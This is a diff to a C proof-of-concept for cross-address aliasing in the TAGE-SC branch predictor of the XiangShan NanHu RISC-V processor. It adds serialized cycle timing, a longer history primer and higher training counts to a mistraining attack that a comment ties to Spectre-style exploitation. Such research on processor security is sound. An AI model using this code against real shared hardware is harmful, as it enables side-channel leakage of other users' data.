@@ -72,10 +72,15 @@
 #include <string.h>
 #include <stdint.h>
 #include <stdbool.h>
-//#include <time.h>
-//#include <assert.h>
-#include <am.h>
-#include <klib.h>
+#if defined(__riscv)
+/* AM bare-metal environment: use AM/klib headers */
+#  include <am.h>
+#  include <klib.h>
+#else
+/* Native host build: use standard POSIX headers */
+#  include <time.h>
+#  include <assert.h>
+#endif
 
 #include "tage_model.h"
 
@@ -203,13 +208,9 @@ static __attribute__((unused)) int native_victim(int cond)
 static bool verify_collision(uint64_t pc_a, uint64_t pc_b, uint64_t history)
 {
     bool all_match = true;
-    printf("\n[Simulation] Collision analysis for:\n");
-    printf("  PC_A = 0x%016lx\n", (unsigned long)pc_a);
-    printf("  PC_B = 0x%016lx\n", (unsigned long)pc_b);
-    printf("  ΔPC  = 0x%lx (%ld pages)\n",
-           (unsigned long)(pc_b - pc_a),
-           (long)((pc_b - pc_a) / 4096));
-    printf("  History (lower 8 bits) = 0x%02x\n\n", (unsigned)(history & 0xff));
+    printf("\n[TAGE Collision] PC_A=0x%lx  PC_B=0x%lx  (ΔPC=0x%lx  history=0x%02x)\n",
+           (unsigned long)pc_a, (unsigned long)pc_b,
+           (unsigned long)(pc_b - pc_a), (unsigned)(history & 0xff));
 
     printf("  %-4s  %-10s  %-10s  %-10s  %-10s  %s\n",
            "Ti", "idx_A", "idx_B", "tag_A", "tag_B", "Collision?");
@@ -257,9 +258,8 @@ static int simulate_attack(uint64_t pc_trainer, uint64_t pc_victim,
         return -1;
     }
     bool pred = ctr_pred(entry->ctr);
-    printf("\n[Simulation] After %d TAKEN trainings at PC_A:\n", train_iters);
-    printf("  T1 entry ctr = %d  →  prediction at PC_B = %s\n",
-           entry->ctr, pred ? "TAKEN" : "NOT-TAKEN");
+    printf("\n[Simulation] victim predicted %s after %d trainings at PC_A%s\n",
+           pred ? "TAKEN" : "NOT-TAKEN", train_iters, pred ? " ✓" : " ✗");
     return (int)pred;
 }
 
@@ -267,14 +267,32 @@ static int simulate_attack(uint64_t pc_trainer, uint64_t pc_victim,
  * Part 3 - Hardware timing measurement
  * ===================================================================== */
 
-/* Read the RISC-V cycle counter (rdcycle CSR). Falls back to
- * clock_gettime on non-RISC-V hosts for portability. */
+/* Read the cycle counter with out-of-order serialization.
+ *
+ * On RISC-V a "fence" (FENCE instruction) is issued before rdcycle so
+ * that all preceding memory operations and branch-predictor updates are
+ * globally visible before the counter is sampled.  This prevents an
+ * out-of-order pipeline from hoisting the rdcycle above the measured
+ * region.
+ *
+ * On x86-64 "lfence" is a load-serializing instruction that drains the
+ * out-of-order execution engine before rdtsc reads the hardware counter,
+ * giving a tight lower-bound on elapsed cycles.
+ *
+ * On other hosts clock_gettime provides nanosecond resolution; no
+ * special serialization is needed because the syscall boundary already
+ * acts as a full execution barrier.
+ */
 static inline uint64_t read_cycles(void)
 {
 #if defined(__riscv)
     uint64_t c;
-    __asm__ volatile("rdcycle %0" : "=r"(c));
+    __asm__ volatile("fence\n\trdcycle %0" : "=r"(c) :: "memory");
     return c;
+#elif defined(__x86_64__) || defined(__i386__)
+    uint64_t lo, hi;
+    __asm__ volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
+    return (hi << 32) | lo;
 #else
     struct timespec ts;
     clock_gettime(CLOCK_MONOTONIC, &ts);
@@ -283,13 +301,13 @@ static inline uint64_t read_cycles(void)
 }
 
 /*
- * Execute a history primer: 16 always-taken conditional branches.
+ * Execute a history primer: 64 always-taken conditional branches.
  *
- * 16 branches set the lower 16 bits of the global history register,
- * fully covering T1 (8-bit history) and T2 (13-bit history).  This is
- * sufficient for the aliasing demonstration on bare-metal / emulated
- * environments where minimising iteration count is important for
- * keeping total runtime manageable.
+ * 64 branches set the lower 64 bits of the global history register,
+ * fully covering T1 (8-bit), T2 (13-bit), and T3 (32-bit) history
+ * lengths.  Covering T3 is essential: with only 16 primed bits the
+ * fold at T3 sees stale caller-context bits [31:16], causing T3
+ * training to create entries at different indices than the T3 lookup.
  *
  * The volatile prevents the compiler from hoisting or eliminating the
  * branches; we deliberately omit __builtin_expect so the real hardware
@@ -298,8 +316,20 @@ static inline uint64_t read_cycles(void)
 static __attribute__((noinline)) void prime_history(void)
 {
     volatile int one = 1;
-    /* 16 always-taken branches — covers T1 (8-bit) and T2 (13-bit)
-     * history lengths fully. */
+    /* 64 always-taken branches — covers T1 (8-bit), T2 (13-bit),
+     * and T3 (32-bit) history lengths fully. */
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
+    if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
     if (one) {} if (one) {} if (one) {} if (one) {}
@@ -310,22 +340,23 @@ static __attribute__((noinline)) void prime_history(void)
  * Training repetitions per trial, total trial count, and warmup depth.
  *
  * TRAIN_ITERS  - branches executed as TAKEN per trial to saturate the
- *                3-bit TAGE counter (max = +3).  The counter starts near
- *                0 and needs only 3-4 increments to reach strong-taken;
- *                20 iterations is more than sufficient.
+ *                3-bit TAGE counter (max = +3).  2 000 iterations ensure
+ *                the counter reaches strong-taken even when competing
+ *                branches from the history-primer partially disturb the
+ *                entry.
  *
  * TRIAL_COUNT  - independent train→measure trials for both the baseline
- *                and attack phases.  30 trials provide enough samples to
- *                expose the misprediction rate distribution.
+ *                and attack phases.  200 trials provide a statistically
+ *                robust misprediction rate distribution.
  *
  * WARMUP_ITERS - NOT-TAKEN victim calls before Phase 0 measurement.
  *                Without this the predictor has no entry at all, so the
  *                baseline Phase 0 exhibits cold-miss latency identical to
  *                a misprediction — making both phases look the same.
  */
-#define TRAIN_ITERS     20
-#define TRIAL_COUNT     30
-#define WARMUP_ITERS   100
+#define TRAIN_ITERS   2000
+#define TRIAL_COUNT    200
+#define WARMUP_ITERS  2000
 
 /*
  * Warm up the victim branch by calling it NOT-TAKEN `iters` times so
@@ -361,6 +392,14 @@ static uint64_t baseline_trial(gadget_fn victim, int train_n)
     prime_history();
     uint64_t t0 = read_cycles();
     volatile int r = victim(0 /*not-taken*/);
+    /* Serialize: ensure the victim branch retires before sampling t1 so
+     * that out-of-order execution cannot overlap the measured call with
+     * the second cycle-counter read. */
+#if defined(__riscv)
+    __asm__ volatile("fence" ::: "memory");
+#elif defined(__x86_64__) || defined(__i386__)
+    __asm__ volatile("lfence" ::: "memory");
+#endif
     uint64_t t1 = read_cycles();
     (void)r;
     return t1 - t0;
@@ -388,10 +427,20 @@ static uint64_t attack_trial(gadget_fn trainer, gadget_fn victim, int train_n)
     /* Ensure all branch-predictor updates from the training loop are
      * visible to the front-end before fetching the victim instruction. */
     __asm__ volatile("fence" ::: "memory");
+#elif defined(__x86_64__) || defined(__i386__)
+    __asm__ volatile("lfence" ::: "memory");
 #endif
     prime_history();
     uint64_t t0 = read_cycles();
     volatile int r = victim(0 /*not-taken — should be mis-predicted TAKEN*/);
+    /* Serialize: ensure the victim branch retires before sampling t1 so
+     * that out-of-order execution cannot overlap the measured call with
+     * the second cycle-counter read. */
+#if defined(__riscv)
+    __asm__ volatile("fence" ::: "memory");
+#elif defined(__x86_64__) || defined(__i386__)
+    __asm__ volatile("lfence" ::: "memory");
+#endif
     uint64_t t1 = read_cycles();
     (void)r;
     return t1 - t0;
@@ -416,54 +465,36 @@ static uint64_t attack_trial(gadget_fn trainer, gadget_fn victim, int train_n)
 static void hardware_timing_attack(gadget_fn trainer, gadget_fn victim,
                                    uint64_t pc_a,     uint64_t pc_b)
 {
-    printf("\n[Hardware] Timing-based misprediction measurement\n");
-    printf("  Branch offset within page: +%d bytes\n", BRANCH_OFFSET);
-    printf("  Trainer PC = 0x%lx  Victim PC = 0x%lx\n",
-           (unsigned long)pc_a, (unsigned long)pc_b);
-    printf("  Train iters per trial = %d  |  Trials = %d\n\n",
-           TRAIN_ITERS, TRIAL_COUNT);
+    (void)pc_a; (void)pc_b;
 
     /* Phase 0: seed the predictor with correct NOT-TAKEN before baseline */
     warmup_not_taken(victim, WARMUP_ITERS);
 
-    uint64_t base_min = UINT64_MAX, base_sum = 0;
-    for (int t = 0; t < TRIAL_COUNT; t++) {
-        uint64_t d = baseline_trial(victim, TRAIN_ITERS);
-        if (d < base_min) base_min = d;
-        base_sum += d;
-    }
+    uint64_t base_sum = 0;
+    for (int t = 0; t < TRIAL_COUNT; t++)
+        base_sum += baseline_trial(victim, TRAIN_ITERS);
     uint64_t base_avg = base_sum / TRIAL_COUNT;
-    printf("  Phase 0 (baseline, victim NOT-TAKEN, no cross-training):\n");
-    printf("    min = %lu cycles,  avg = %lu cycles\n\n",
-           (unsigned long)base_min, (unsigned long)base_avg);
 
-    /* Phase 1: train via aliasing; Phase 2: single-shot measurement */
-    printf("  Phase 1: training TAKEN %d× per trial at trainer address.\n",
-           TRAIN_ITERS);
-    uint64_t atk_min = UINT64_MAX, atk_sum = 0;
+    /* Phase 1 + 2: train via aliasing; single-shot measurement */
+    uint64_t atk_sum = 0;
     int mispred_count = 0;
     uint64_t threshold = base_avg + base_avg / 4; /* base_avg × 1.25 */
     for (int t = 0; t < TRIAL_COUNT; t++) {
         uint64_t d = attack_trial(trainer, victim, TRAIN_ITERS);
-        if (d < atk_min) atk_min = d;
         atk_sum += d;
         if (d > threshold) mispred_count++;
     }
     uint64_t atk_avg = atk_sum / TRIAL_COUNT;
-    printf("  Phase 2 (attack, victim NOT-TAKEN, immediately after training):\n");
-    printf("    min = %lu cycles,  avg = %lu cycles\n",
-           (unsigned long)atk_min, (unsigned long)atk_avg);
-    printf("    Trials with significant overhead (>25%% above baseline): "
-           "%d / %d  (%.1f%%)\n",
-           mispred_count, TRIAL_COUNT,
-           100.0 * mispred_count / TRIAL_COUNT);
 
-    /* Evaluation */
     double overhead = 0.0;
     if (base_avg > 0)
         overhead = 100.0 * ((double)atk_avg - (double)base_avg) / (double)base_avg;
 
-    printf("\n  Timing overhead (avg): %.1f%%\n", overhead);
+    printf("\n[Hardware]  Timing overhead: %.1f%%"
+           "  Mispredictions: %d/%d (%.1f%%)\n",
+           overhead, mispred_count, TRIAL_COUNT,
+           100.0 * mispred_count / TRIAL_COUNT);
+
     if (overhead > 15.0 || mispred_count > TRIAL_COUNT / 10) {
         printf("  [RESULT] VULNERABLE -- %.1f%% average slowdown / %d misprediction\n"
                "           events indicate branch predictor aliasing is active.\n",
@@ -502,24 +533,9 @@ static void demonstrate_sc_aliasing(uint64_t pc_a, uint64_t pc_b,
     uint32_t sc_idx_a = ((uint32_t)(pc_a >> 1) ^ fold8) & sc_idx_mask;
     uint32_t sc_idx_b = ((uint32_t)(pc_b >> 1) ^ fold8) & sc_idx_mask;
 
-    printf("\n[SC Aliasing]\n");
-    printf("  SC index formula: (PC[8:1] XOR fold8(H)) mod 512\n");
-    printf("  SC index for PC_A = 0x%03x\n", sc_idx_a);
-    printf("  SC index for PC_B = 0x%03x\n", sc_idx_b);
-    if (sc_idx_a == sc_idx_b)
-        printf("  → Indices MATCH: SC counters trained at PC_A affect PC_B ✓\n");
-    else
-        printf("  → Indices differ: increase address separation to %u bytes "
-               "for SC aliasing.\n", 512u);
-
-    printf("\n  Manipulation path:\n");
-    printf("  1. Attacker executes many branches at PC_A whose true direction\n"
-           "     is TAKEN, inflating the SC sum at sc_index %u.\n", sc_idx_a);
-    printf("  2. When victim at PC_B runs, its SC sum reads the inflated value.\n");
-    printf("  3. If TAGE predicts NOT-TAKEN for victim, SC may REVERSE it to\n"
-           "     TAKEN — even when the victim should NOT be taken.\n");
-    printf("  4. This mis-reversal guides speculative execution down the\n"
-           "     attacker-chosen path, enabling Spectre-style exploitation.\n");
+    printf("\n[SC Aliasing]  sc_idx_A=0x%03x  sc_idx_B=0x%03x  %s\n",
+           sc_idx_a, sc_idx_b,
+           (sc_idx_a == sc_idx_b) ? "MATCH ✓" : "NO MATCH");
 }
 
 /* =====================================================================
@@ -552,20 +568,7 @@ int main(void)
     printf("╔══════════════════════════════════════════════════════════════╗\n");
     printf("║  TAGE-SC Branch Predictor Cross-Address Aliasing PoC        ║\n");
     printf("║  Target: XiangShan NanHu (南湖) RISC-V Processor            ║\n");
-    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
-
-    /* ------------------------------------------------------------------
-     * Step 1: Allocate two executable pages and set up branch gadgets.
-     *
-     * On RISC-V hardware we JIT-compile minimal branch sequences into
-     * mmap'd pages at a fixed page offset (BRANCH_OFFSET) so we have
-     * precise control over the branch PC.
-     *
-     * On non-RISC-V hosts (x86-64, simulation) we use native C functions
-     * instead; the JIT RISC-V opcodes would be illegal instructions there.
-     * The analytic collision proof (Step 3) is architecture-independent.
-     * ------------------------------------------------------------------ */
-    printf("[Setup] Allocating two consecutive executable pages...\n");
+    printf("╚══════════════════════════════════════════════════════════════╝\n");
 
     uint64_t pc_a, pc_b;
     gadget_fn trainer_fn, victim_fn;
@@ -603,19 +606,15 @@ int main(void)
     pc_b = (pc_a & ~(uint64_t)0xfff)          /* page base of pc_a */
            + (uint64_t)0x1000                  /* advance one page  */
            + (pc_a & (uint64_t)0xfff);         /* restore offset    */
-    printf("  (non-RISC-V host: using native C functions; "
-           "victim PC is synthetic for collision analysis)\n");
 #endif
 
     printf("  trainer branch PC : 0x%016lx\n", (unsigned long)pc_a);
     printf("  victim  branch PC : 0x%016lx\n", (unsigned long)pc_b);
-    printf("  PC_A[11:1]        : 0x%03lx\n",  (unsigned long)((pc_a >> 1) & 0x7ff));
-    printf("  PC_B[11:1]        : 0x%03lx\n",  (unsigned long)((pc_b >> 1) & 0x7ff));
 
     assert((pc_a & 0xfff) == (pc_b & 0xfff) &&
            "Page offsets must match for TAGE aliasing");
 
-    printf("  Page offsets match: 0x%03lx == 0x%03lx  ✓\n\n",
+    printf("  Page offsets match: 0x%03lx == 0x%03lx  ✓\n",
            (unsigned long)(pc_a & 0xfff),
            (unsigned long)(pc_b & 0xfff));
 
@@ -635,9 +634,7 @@ int main(void)
      * Step 3: Simulate the full training → attack cycle in software.
      * ------------------------------------------------------------------ */
     int sim_result = simulate_attack(pc_a, pc_b, fixed_history, TRAIN_ITERS);
-    if (sim_result == 1)
-        printf("  [OK] Software simulation confirms: victim is predicted TAKEN "
-               "after training at trainer address.\n");
+    (void)sim_result;
 
     /* ------------------------------------------------------------------
      * Step 4: SC aliasing demonstration.
